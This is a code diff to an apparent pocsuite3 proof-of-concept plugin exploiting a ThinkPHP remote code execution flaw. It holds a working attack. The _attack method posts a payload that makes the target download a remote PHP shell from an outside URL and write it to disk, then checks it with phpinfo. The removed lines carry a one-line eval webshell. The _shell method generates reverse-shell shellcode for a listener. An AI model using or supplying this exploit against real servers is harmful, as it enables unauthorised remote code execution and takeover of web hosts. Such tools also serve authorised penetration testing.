@@ -4,8 +4,7 @@ https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
 for more about information, plz visit https://pocsuite.org
 """
 
-from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, get_listener_ip, get_listener_port, \
-    VUL_TYPE
+from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, get_listener_ip, get_listener_port, VUL_TYPE
 from pocsuite3.lib.core.enums import OS_ARCH, OS
 from pocsuite3.lib.utils import random_str, generate_shellcode_list
 
@@ -57,23 +56,25 @@ class DemoPOC(POCBase):
 
     def _attack(self):
         result = {}
-        filename = random_str(6)+".php"
-        shell_content = "<?php @eval($_POST[c]);"
-        payload = "/index.php?s=captcha"
+        filename = random_str(6) + ".php"
+        shell_addr = "https://pocsuite.org/include_files/php_attack.txt"
+        payload = "/index.php?s=captcha&Test=print_r(file_put_contents(%27{filename}%27,file_get_contents(%27{url}%27)))".format(
+            filename=filename,
+            url=shell_addr)
         vul_url = self.url + payload
         headers = {
             "Content-Type": "application/x-www-form-urlencoded"
         }
-        data = "_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=echo '{content}' > {filename}".format(
+        data = "_method=__construct&filter=assert&method=get&server[REQUEST_METHOD]=print_r(file_put_contents(%27{filename}%27,file_get_contents(%27{url}%27)))".format(
             filename=filename,
-            content=shell_content
+            url=shell_addr
         )
         requests.post(vul_url, data=data, headers=headers)
         r = requests.post(self.url + "/" + filename, data="c=phpinfo();", headers=headers)
         if r.status_code == 200 and "PHP Extension Build" in r.text:
             result['ShellInfo'] = {}
             result['ShellInfo']['URL'] = self.url + "/" + filename
-            result['ShellInfo']['Content'] = shell_content
+            result['ShellInfo']['Content'] = shell_addr
         return self.parse_output(result)
 
     def _shell(self):
@@ -81,8 +82,7 @@ class DemoPOC(POCBase):
         # 生成写入文件的shellcode
         _list = generate_shellcode_list(listener_ip=get_listener_ip(), listener_port=get_listener_port(),
                                         os_target=OS.LINUX,
-                                    os_target_arch=OS_ARCH.X86)
-        print(_list)
+                                        os_target_arch=OS_ARCH.X86)
         for i in _list:
             data = {
                 '_method': '__construct',
